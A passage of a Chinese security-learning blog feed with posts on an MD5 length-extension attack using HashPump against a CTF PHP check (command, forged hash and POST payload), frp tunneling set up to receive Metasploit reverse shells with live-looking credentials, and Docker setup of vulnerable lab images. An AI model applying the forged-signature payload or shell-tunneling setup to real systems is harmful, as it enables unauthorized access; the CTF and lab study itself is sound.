help(hashpumpy.hashpump)</span><br></pre></td></tr></table></figure><h3 id="2、HashPump用法"><a href="#2、HashPump用法" class="headerlink" title="2、HashPump用法"></a><strong>2、HashPump用法</strong></h3><p>这里以一个实验吧题目为例，关键的代码大概如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret=&quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!</span><br><span class="line">$username=&quot;admin&quot;;</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line">if($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password)))&#123;</span><br><span class="line">    echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">    die (&quot;The flag is &quot;. $flag);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在题目里可以得到:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5($secret.&quot;adminadmin&quot;)的值为571580b26c65f306376d4f64e53cb5c7</span><br></pre></td></tr></table></figure><p>稍微整理下我们已经知道的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$secret是密文，长度为15，如果再算上后面第一个admin，长度就是20</span><br><span class="line">而数据是admin</span><br><span class="line">签名（哈希值）是571580b26c65f306376d4f64e53cb5c7</span><br></pre></td></tr></table></figure><p>这时候我们使用HashPump，附加数据至少1位以上：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./hashpump</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hashpump</span><br><span class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: pcat</span><br></pre></td></tr></table></figure><p>或者直接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a pcat</span><br></pre></td></tr></table></figure><p>就会得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3e67e8f0c05e1ad68020df30bbc505f5</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00pcat</span><br></pre></td></tr></table></figure><p>第一个是新的签名，把它设置到cookies的getmein里。</p><p>第二个先把\x替换为%后，post提交</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00pcat</span><br></pre></td></tr></table></figure><p>就可以通过了。</p><p>-——</p><p>ps.提供一个基于HashPump的在线网站：</p><p><a href="http://sakurity.com/lengthextension">http://sakurity.com/lengthextension</a></p><p>（可能得翻了墙才可以访问，附加数据至少一位以上，message length为密文+数据的总长度，看不到”submit”键请刷新或者换浏览器）</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透</title>
      <link href="/2024/05/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2024/05/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>学习中经常用到kali，但是公网服务器并没有安装kali镜像，本地只安装了kali虚拟机，而msf渗透时常常需要反弹shell到kali中，但内网中的kali并没有公网IP地址，因而可以<strong>通过frp工具将内网中的服务映射到公网IP地址的端口中</strong></p><p><strong>frp</strong> 是一个高性能的反向代理应用，采用C&#x2F;S架构(客户端&#x2F;服务端)，通过简单的配置能够将客户端中的tcp, udp, http, https 等协议隐射到服务端相应端口上，通过访问服务端对应的端口即能够访问到客户端对应的服务。<br>frp实现效果大致如下，通过访问公网服务器的某个端口即可访问到内网服务器中的某个服务<br><img src="https://bu.dusays.com/2024/05/13/6641a8dba2a28.png" alt="image-20240405214341242"></p><p>为了完成frp内外穿透，你需要准备好如下资源&#x2F;工具</p><ul><li>公网服务器，这里我用的是CentOS7.6</li><li>frp服务端&#x2F;客户端工具，<a href="https://github.com/fatedier/frp/releases">github下载</a></li><li>内网服务器或本机，这里我用的是kali2020虚拟机</li></ul><h2 id="开始配置"><a href="#开始配置" class="headerlink" title="开始配置"></a>开始配置</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>将frp文件上传到公网服务器 我这里是使用的Winscp</p><p>我这里上传的是gz压缩文件</p><p>直接解压</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf frp_0.44.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a8db98fbe.png" alt="image-20240405223636139"></p><p>ok</p><p>然后需要修改配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入目录</span><br><span class="line">cd frp_0.33.0_linux_amd64/</span><br><span class="line"></span><br><span class="line"># 打开配置文件</span><br><span class="line">vi frps.ini</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打开后是这样的：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a8db82c11.png" alt="image-20240405225051611"></p><p>将文件内容修改为如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 一、服务器的基本配置部分</span><br><span class="line"># 7000 是FRP服务端口，可以改</span><br><span class="line">bind_port = 7000</span><br><span class="line"># dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = frpadmin@2022</span><br><span class="line"># 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆</span><br><span class="line">dashboard_port = 7500</span><br><span class="line"># 服务器和客户机之间的心跳连接</span><br><span class="line">heartbeat_timeout = 30</span><br><span class="line">#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求</span><br><span class="line">token=frpToken@admin2022</span><br><span class="line"> </span><br><span class="line"># 二、添加的映射端口</span><br><span class="line">[common]</span><br><span class="line"># FRP服务器的公网ip</span><br><span class="line">server_addr = 【这里写自己的公网服务器地址】</span><br><span class="line">#例如：server_addr = 1.1.1.1</span><br><span class="line"></span><br><span class="line"># FRP服务器的，服务端口，这个可以改，不过客户端的也要一起改才行。</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 三、转发端口：[test01]、[test02] 这些没有任何意义，就是大致描述这个端口作用。</span><br><span class="line"># 每增加一个转发端口，复制下面的两行，然后将[]里面的和vhost_http_port_03改了就行了。</span><br><span class="line">#[test01]</span><br><span class="line">#vhost_http_port = 9001</span><br><span class="line"> </span><br><span class="line">#[test02]</span><br><span class="line">#vhost_tcp_port = 1315</span><br><span class="line">#转发端口配置，实际测试这里影响不大，主要取决于客户端的配置</span><br><span class="line">vhost_http_port = 9001</span><br><span class="line">vhost_ssh_port = 9002</span><br><span class="line">vhost_tcp_port = 9003</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = frpadmin@2022</span><br><span class="line">dashboard_port = 7500</span><br><span class="line">heartbeat_timeout = 30</span><br><span class="line">token=frpToken@admin2022</span><br><span class="line">[common]</span><br><span class="line">server_addr = 124.223.91.44</span><br><span class="line">server_port = 7000</span><br><span class="line">vhost_http_port = 9001</span><br><span class="line">vhost_ssh_port = 9002</span><br><span class="line">vhost_tcp_port = 9003</span><br></pre></td></tr></table></figure><p>esc 然后:wq 保存并退出</p><p><img src="https://bu.dusays.com/2024/05/13/6641a8dba04d9.png" alt="image-20240405232528251"></p><p>配置好后运行文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a8db85b53.png" alt="image-20240405232610629"></p><p>7500端口就是frp的网页管理端口，可以访问（账号密码在配置文件中）</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>同样的方式将frp工具上传到kali虚拟机中，这里要确保kali是能够正常联网的，同样用tar命令解压，配置frpc.ini文件如下：</p><p>更服务端的操作一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 客户端配置</span><br><span class="line">[common]</span><br><span class="line">server_addr = 【这里写自己的公网服务器地址】</span><br><span class="line">#例如：server_addr = 1.1.1.1</span><br><span class="line">server_port = 7000          #frp服务端口要和服务端设定的一致</span><br><span class="line">token = frpToken@admin2022  #token要和服务端一致</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 配置http服务，可用于小程序开发、远程调试等，如果没有可以不写下面的</span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_ip = 0.0.0.0</span><br><span class="line">local_port = 80   #本地需要映射的端口</span><br><span class="line">custom_domains = 【这里写自己的公网服务器地址】</span><br><span class="line">remote_port = 9001 #映射到服务端的端口</span><br><span class="line"></span><br><span class="line">#kali ssh</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 0.0.0.0</span><br><span class="line">local_port = 22</span><br><span class="line">custom_domains = 【这里写自己的公网服务器地址】</span><br><span class="line">remote_port = 9002  </span><br><span class="line"></span><br><span class="line">#tcp msfconsole</span><br><span class="line">[tcp]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 0.0.0.0</span><br><span class="line">local_port = 9003</span><br><span class="line">custom_domains = 【这里写自己的公网服务器地址】</span><br><span class="line">remote_port = 9003</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a8dbf4205.png" alt="image-20240405235232663"></p><p>这样应该就可以了</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="/2024/05/13/docker/"/>
      <url>/2024/05/13/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="docker介绍"><a href="#docker介绍" class="headerlink" title="docker介绍"></a>docker介绍</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可抑制的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器完全使用沙盒机制，相互之间不会存在任何接口。几乎没有性能开销，可以很容易的在机器和数据中心运行。最重要的是，他们不依赖于任何语言、框架或者包装系统。</p><p>小知识：沙盒也叫沙箱（sandbox）。在计算机领域指一种虚拟技术，而且多用于计算机安全技术。安全软件可以让它在沙盒中运行，如果含有恶意行为，则禁止程序的进一步运行，而这不会对系统造成任何危害。</p><p>Docker是dotCloud公司开源的一个基于LXC的高级容器引擎，源码托管在Github上，基于go语言并且遵从Apache2.0协议开源。</p><h2 id="Docker容器技术与虚拟机的区别"><a href="#Docker容器技术与虚拟机的区别" class="headerlink" title="Docker容器技术与虚拟机的区别"></a>Docker容器技术与虚拟机的区别</h2><p>docker和容器技术和虚拟机技术，都是虚拟化技术。</p><p>docker有着比虚拟机更少的抽象层。 由于docker不需要Hypervisor实现硬件资源虚拟化，运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。所以docker效率比虚拟机效率高。达到了秒级启动的地步。</p><p>docker相较于VM的优点：</p><blockquote><p>1、比VM小、快，Docker容器的尺寸减小相比于整个虚拟机大大简化了分布<br>到云和分发时间的开销。Docker启动一个容器实例时间仅仅需要几秒钟。</p><p>2、Docker是一个开放的平台，构建、发布和运行分布式应用程序。</p><p>3、开发人员不需要关系具体是哪个Linux操作系统</p><p>4、Google、微软（azure）、亚马逊、IBM等都支持docker。</p><p>5、Docker支持Unix&#x2F;Linux操作系统，也支持Windows和Mac。</p></blockquote><p>Docker局限性：<br>Docker用于应用程序时是最有用的，但并不包含数据。日志、数据库等通常放在Docker容器外。一个容器的镜像通常都很小，不用和存储大量数据，存储可以通过外部挂载等方式使用，比如：NFS、ipsan、MFS等 ，或者docker命令 ，-v映射磁盘分区。</p><p>总之，docker只用于计算，存储交给别人。</p><p>Docker特性。<br>文件系统隔离：每个进程容器运行在一个完全独立的根文件系统里。</p><p>资源隔离：系统资源，像CPU和内存等可以分配到不同的容器中，使用cgroup。<br>网络隔离：每个进程容器运行在自己的网路空间，虚拟接口和IP地址。</p><p>日志记录：Docker将收集到和记录的每个进程容器的标准流（stdout&#x2F;stderr&#x2F;stdin），用于实时检索或者批量检索</p><p>变更管理：容器文件系统的变更可以提交到新的镜像中，并可重复使用以创建更多的容器。无需使用模板或者手动配置。</p><p>交互式shell：Docker可以分配一个虚拟终端并且关联到任何容器的标准输出上，例如运行一个一次性交互shell。</p><h1 id="kali下docker安装"><a href="#kali下docker安装" class="headerlink" title="kali下docker安装"></a>kali下docker安装</h1><h2 id="Linux内核版本查看"><a href="#Linux内核版本查看" class="headerlink" title="Linux内核版本查看"></a>Linux内核版本查看</h2><blockquote><p>#安装docker要求内核版本kerner&gt;&#x3D;3.10<br>#为此，先检查当前Linux系统的内核版本<br><code>uname -a</code></p></blockquote><h2 id="更新apt"><a href="#更新apt" class="headerlink" title="更新apt"></a>更新apt</h2><blockquote><p>#新重写sources.list中内容，一个个字母删除太久了<br><code>cho &gt; /etc/apt/sources.list</code></p><p>#进入sources.lis重新编辑apt源<br><code>vim /etc/apt/sources.list</code></p><p>#直接CV大法写入下面的apt源</p><p>#阿里云<br><code>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</code><br><code>deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </code></p></blockquote><p>这一步在我实际安装时其实是没有执行的 不影响</p><h2 id="进行系统或工具更新"><a href="#进行系统或工具更新" class="headerlink" title="进行系统或工具更新"></a>进行系统或工具更新</h2><blockquote><p>进行系统或工具的更新（还是要挺久的 ）<br>注：当出现正在设定软件包界面时，直接按<code>tab+enter</code>进行确认<br><code>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</code></p><p>礼貌性清除更新缓存<br><code>apt-get clean</code></p></blockquote><h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><blockquote><p>为什么采用apt安装？因为之后采用apt源安装Docker的其他组件时，新组件与已安装的Docker容器最为匹配。<br>apt-get install docker docker-compose</p><p>或<br>apt-get install docker.io</p></blockquote><p>我这里是第二个可以执行 第一个报错</p><h2 id="检验Docker"><a href="#检验Docker" class="headerlink" title="检验Docker"></a>检验Docker</h2><blockquote><p>启动docker服务 </p><p>service docker start</p></blockquote><blockquote><p>查看docker版本</p><p>docker -v</p></blockquote><blockquote><p>列出docker现有镜像 </p><p>docker images</p></blockquote><p>好像要root用户</p><p>因为我没有安装任何镜像 所以的镜像中为空</p><h2 id="Docker开机自启"><a href="#Docker开机自启" class="headerlink" title="Docker开机自启"></a>Docker开机自启</h2><blockquote><p>设置docker开机自启<br>systemctl enable docker</p></blockquote><h2 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h2><h3 id="拉取环境"><a href="#拉取环境" class="headerlink" title="拉取环境"></a>拉取环境</h3><h4 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">以拉取 CVE-2017-7504 的漏洞环境为例。</span><br><span class="line">docker search testjboss    #搜索漏洞环境</span><br><span class="line">docker pull testjboss/jboss#拉取漏洞环境</span><br><span class="line">docker run -d -p 80:8080 testjboss/jboss:latest#根据testjboss/jboss镜像创建并运行容器</span><br><span class="line">ifconfig#查看已运行容器ip</span><br><span class="line">#kali中，使用浏览器访问http://IP#IP可为127.0.0.1</span><br><span class="line">docker ps#查看正在运行的容器</span><br><span class="line">docker exec -it e8f4844aabc1 /bin/bash#进入容器(id:e8f4844aabc1)</span><br><span class="line">exit#退出容器到宿主机（容器不会停止运行）</span><br><span class="line">docker stop 3b41c0c08430#关闭容器(id唯一标识，建议使用id)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a888aa457.png" alt="image-20240402231620258"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a889390c3.png" alt="image-20240402231637817"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a888e326c.png" alt="image-20240402231649876"></p><h4 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h4><p>Docker搭建LAMP环境</p><blockquote><p>LAMP是指Linux+Apache+MYSQL+PHP 一个经典的网络架构</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull linode/lamp</span><br><span class="line">直接在Docker中拉取一个现成的LAMP镜</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a88933d07.png" alt="image-20240403000528688"></p><p>其实是比较慢的 但是可以通过切换Docker镜像源的方法加速</p><p>然后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -p 8001:80 linode/lamp /bin/bash</span><br></pre></td></tr></table></figure><p>以linode&#x2F;lamp镜像创建容器并且将容器的80端口映射到本机8001端口</p><p>再分别输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line"></span><br><span class="line">service mysql start</span><br></pre></td></tr></table></figure><p>命令启动服务</p><p><img src="https://bu.dusays.com/2024/05/13/6641a889424bf.png" alt="image-20240403001248397"></p><p>kali访问127.0.0.1：8001</p><p><img src="https://bu.dusays.com/2024/05/13/6641a8877695d.png" alt="image-20240403001515272"></p><h4 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h4><p>Docker Compose搭建实验环境</p><p>Docker Compose是用于定义和运行多容器应用程序的工具</p><p>使用步骤：</p><blockquote><p>1.使用Dockerfile定义应用程序的环境</p><p>2.使用docker-compose.yml定义构成应用程序的服务，这样它们可以在隔离环境中一起运行</p><p>3.执行docker-compose up 命令来启动并运行整个应用程序</p></blockquote><p>安装docker-compose</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-compose</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a8892ea66.png" alt="image-20240403003730268"></p><p>检查</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure><p>只要给出实验环境的docker-compose.yml文件  我们只需要新建文件夹，然后将docker-compose.yml文件放在该目录中，进入该目录执行<code>docker-compose up -d</code>命令即可构建环境并启动实验环境， -d参数表示后台运行 可根据需要填写</p><p>用docker compose搭建漏洞 CVE-2020-17518</p><p>docker-compose.yml：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;2&#x27;</span><br><span class="line">services:</span><br><span class="line"> flink:</span><br><span class="line">   image: vulhub/flink:1.11.2</span><br><span class="line">   command: jobmanager</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;8081:8081&quot;</span><br><span class="line">    - &quot;6123:6123&quot;</span><br></pre></td></tr></table></figure><p>这里可能是yml文件的问题 最后在执行docker-compose up -d时报错了 但时步骤因该是没问题的</p><p>从这里的YAML文件可以看出 映射的有两个端口 8081和6123 其中8081为web服务端口</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#系统命令</span><br><span class="line">systemctl start docker#启动docker</span><br><span class="line">systemctl stop docker#停止docker</span><br><span class="line">systemctl restart docker#重启docker</span><br><span class="line">systemctl enable docker#设置docker开机自启</span><br><span class="line"> </span><br><span class="line">#基本命令</span><br><span class="line">docker version#查看docker版本</span><br><span class="line">docker info#查看docker详细信息</span><br><span class="line">docker --help#查看docker命令</span><br><span class="line"> </span><br><span class="line">#镜像命令</span><br><span class="line">docker images#查看docker镜像列表</span><br><span class="line">docker images -a#列出本地所有镜像</span><br><span class="line">docker images --digests#显示镜像的摘要信息</span><br><span class="line">docker search redis#从Docker Hub上查找redis镜像</span><br><span class="line">docker pull redis#从Docker Hub上下载redis镜像</span><br><span class="line">docker rmi 373f0984b070#删除IMAGE ID 为373f0984b070的镜像</span><br><span class="line">docker search 镜像名           #搜索镜像</span><br><span class="line">docker pull 镜像名 [标签]      #下载镜像（如果不写tag，默认是latest）</span><br><span class="line">docker rmi 镜像名 [标签]       #删除镜像    docker rmi -f $(docker images -aq)  删除全部镜像</span><br><span class="line">docker tag  镜像名:版本   新镜像名:版本    #复制镜像并且修改名称</span><br><span class="line">docker commit  -a &quot;xxx&quot;  -c &quot;xxx&quot; 镜像ID 名字：版本   #提交镜像 </span><br><span class="line">-a :提交的镜像作者；</span><br><span class="line">-c :使用Dockerfile指令来创建镜像；</span><br><span class="line">-m :提交时的说明文字；</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">#运行命令</span><br><span class="line">#-p 6379:6379端口映射：前表示主机部分,后表示容器部分</span><br><span class="line">#-d在后台运行容器（不进入终端）并打印容器ID/容器名</span><br><span class="line">#--name myredis表示自定义容器名为myredis</span><br><span class="line">docker run -d -p 6379:6379 --name myredis redis:latest#根据镜像创建并运行容器</span><br><span class="line">--name = &quot;Name&quot;   容器名字</span><br><span class="line">-c   后面跟待完成的命令</span><br><span class="line">-d   以后台方式运行并且返回ID，启动守护进程式容器</span><br><span class="line">-i   使用交互方式运行容器，通常与t同时使用</span><br><span class="line">-t   为容器重新分配一个伪输入终端。也即启动交互式容器</span><br><span class="line">-p   指定容器端口    -p 容器端口:物理机端口  映射端口</span><br><span class="line">-P   随机指定端口</span><br><span class="line">-v   给容器挂载存储卷</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">#容器命令</span><br><span class="line">docker container ls 或 docker ps#查看正在运行的容器</span><br><span class="line">docker container ls -a 或 docker ps -a#列出所有容器</span><br><span class="line">docker container start 容器ID 或 容器名称#启动容器</span><br><span class="line">docker start 容器ID 或 容器名称#启动容器</span><br><span class="line">docker container stop 容器ID 或 容器名称#停止容器</span><br><span class="line">docker stop 容器ID 或 容器名称#停止容器</span><br><span class="line">docker container rm 容器ID 或 容器名称#删除容器</span><br><span class="line">docker rm 容器ID 或 容器名称#删除容器</span><br><span class="line">docker container logs -f 容器ID 或 容器名称#查看容器日志</span><br><span class="line">docker exec -it name /bin/bash #进入name（容器名/id）中开启交互式的终端，exit退出</span><br><span class="line"></span><br><span class="line">docker build  #创建镜像        -f：指定dockerfile文件路径   -t：镜像名字以及标签</span><br><span class="line">docker logs 容器实例的ID          #查看容器日志</span><br><span class="line">docker rename 旧名字  新名字      # 给容器重新命名</span><br><span class="line">docker top    容器实例的ID                  #查看容器内进程</span><br><span class="line">docker ps -a                    #列出所有容器（不加-a就是在运行的）</span><br><span class="line">docker rm      容器实例的ID                 #删除容器（正在运行容器不能删除，除非加-f选项）</span><br><span class="line">docker kill  容器实例的ID        #杀掉容器</span><br><span class="line">docker history   容器实例的ID    #查看docker镜像的变更历史</span><br><span class="line">docker start 容器实例的ID        #启动容器</span><br><span class="line">docker restart 容器实例的ID       #重启容器</span><br><span class="line">docker stop 容器实例的ID         #停止正在运行的容器</span><br><span class="line">docker attach /docker exec  容器实例的ID   #同为进入容器命令，不同的是attach连接终止会让容器退出后台运行，而exec不会。并且，docker attach是进入正在执行的终端，不会情动新的进程，而docker exec则会开启一个新的终端，可以在里面操作。</span><br><span class="line">docker image inspect  容器名称：容器标签       #查看容器内源数据</span><br><span class="line">docker cp  容器id：容器内路径   目的主机路径           #从容器内拷贝文件到主机（常用）或者从主机拷贝到容器（一般用挂载）</span><br><span class="line">exit                           #直接退出容器 </span><br><span class="line">crlt + P + Q                   #退出容器但是不终止运行</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="docker-–help中文译解"><a href="#docker-–help中文译解" class="headerlink" title="docker –help中文译解"></a>docker –help中文译解</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">docker [OPTIONS] COMMAND [arg...]</span><br><span class="line">       docker daemon [ --help | ... ]</span><br><span class="line">       docker [ --help | -v | --version ]</span><br><span class="line">A</span><br><span class="line">self-sufficient runtime for containers.</span><br><span class="line"> </span><br><span class="line">Options:</span><br><span class="line">  --config=~/.docker              Location of client config files  #客户端配置文件的位置</span><br><span class="line">  -D, --debug=false               Enable debug mode  #启用Debug调试模式</span><br><span class="line">  -H, --host=[]                   Daemon socket(s) to connect to  #守护进程的套接字（Socket）连接</span><br><span class="line">  -h, --help=false                Print usage  #打印使用</span><br><span class="line">  -l, --log-level=info            Set the logging level  #设置日志级别</span><br><span class="line">  --tls=false                     Use TLS; implied by--tlsverify  #</span><br><span class="line">  --tlscacert=~/.docker/ca.pem    Trust certs signed only by this CA  #信任证书签名CA</span><br><span class="line">  --tlscert=~/.docker/cert.pem    Path to TLS certificate file  #TLS证书文件路径</span><br><span class="line">  --tlskey=~/.docker/key.pem      Path to TLS key file  #TLS密钥文件路径</span><br><span class="line">  --tlsverify=false               Use TLS and verify the remote  #使用TLS验证远程</span><br><span class="line">  -v, --version=false             Print version information and quit  #打印版本信息并退出</span><br><span class="line"> </span><br><span class="line">Commands:</span><br><span class="line">    attach    Attach to a running container  #当前shell下attach连接指定运行镜像</span><br><span class="line">    build     Build an image from a Dockerfile  #通过Dockerfile定制镜像</span><br><span class="line">    commit    Create a new image from a container&#x27;s changes  #提交当前容器为新的镜像</span><br><span class="line">    cp      Copy files/folders from a container to a HOSTDIR or to STDOUT  #从容器中拷贝指定文件或者目录到宿主机中</span><br><span class="line">    create    Create a new container  #创建一个新的容器，同run 但不启动容器</span><br><span class="line">    diff      Inspect changes on a container&#x27;s filesystem  #查看docker容器变化</span><br><span class="line">    events    Get real time events from the server#从docker服务获取容器实时事件</span><br><span class="line">    exec      Run a command in a running container#在已存在的容器上运行命令</span><br><span class="line">    export    Export a container&#x27;s filesystem as a tar archive  #导出容器的内容流作为一个tar归档文件(对应import)</span><br><span class="line">    history   Show the history of an image  #展示一个镜像形成历史</span><br><span class="line">    images    List images  #列出系统当前镜像</span><br><span class="line">    import    Import the contents from a tarball to create a filesystem image  #从tar包中的内容创建一个新的文件系统映像(对应export)</span><br><span class="line">    info      Display system-wide information  #显示系统相关信息</span><br><span class="line">    inspect   Return low-level information on a container or image  #查看容器详细信息</span><br><span class="line">    kill      Kill a running container  #kill指定docker容器</span><br><span class="line">    load      Load an image from a tar archive or STDIN  #从一个tar包中加载一个镜像(对应save)</span><br><span class="line">    login     Register or log in to a Docker registry#注册或者登陆一个docker源服务器</span><br><span class="line">    logout    Log out from a Docker registry  #从当前Docker registry退出</span><br><span class="line">    logs     Fetch the logs of a container  #输出当前容器日志信息</span><br><span class="line">    pause     Pause all processes within a container#暂停容器</span><br><span class="line">    port      List port mappings or a specific mapping for the CONTAINER  #查看映射端口对应的容器内部源端口</span><br><span class="line">    ps      List containers  #列出容器列表</span><br><span class="line">    pull      Pull an image or a repository from a registry  #从docker镜像源服务器拉取指定镜像或者库镜像</span><br><span class="line">    push      Push an image or a repository to a registry  #推送指定镜像或者库镜像至docker源服务器</span><br><span class="line">    rename    Rename a container  #重命名容器</span><br><span class="line">    restart   Restart a running container  #重启运行的容器</span><br><span class="line">    rm      Remove one or more containers  #移除一个或者多个容器</span><br><span class="line">    rmi      Remove one or more images  #移除一个或多个镜像(无容器使用该镜像才可以删除，否则需要删除相关容器才可以继续或者-f强制删除)</span><br><span class="line">    run     Run a command in a new container  #创建一个新的容器并运行一个命令</span><br><span class="line">    save      Save an image(s) to a tar archive#保存一个镜像为一个tar包(对应load)</span><br><span class="line">    search    Search the Docker Hub for images  #在docker</span><br><span class="line">hub中搜索镜像</span><br><span class="line">    start     Start one or more stopped containers#启动容器</span><br><span class="line">    stats     Display a live stream of container(s) resource usage statistics  #统计容器使用资源</span><br><span class="line">    stop      Stop a running container  #停止容器</span><br><span class="line">    tag       Tag an image into a repository  #给源中镜像打标签</span><br><span class="line">    top       Display the running processes of a container #查看容器中运行的进程信息</span><br><span class="line">    unpause   Unpause all processes within a container  #取消暂停容器</span><br><span class="line">    version   Show the Docker version information#查看容器版本号</span><br><span class="line">    wait      Block until a container stops, then print its exit code  #截取容器停止时的退出状态值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpfakeIP</title>
      <link href="/2024/05/13/burpfakeIP/"/>
      <url>/2024/05/13/burpfakeIP/</url>
      
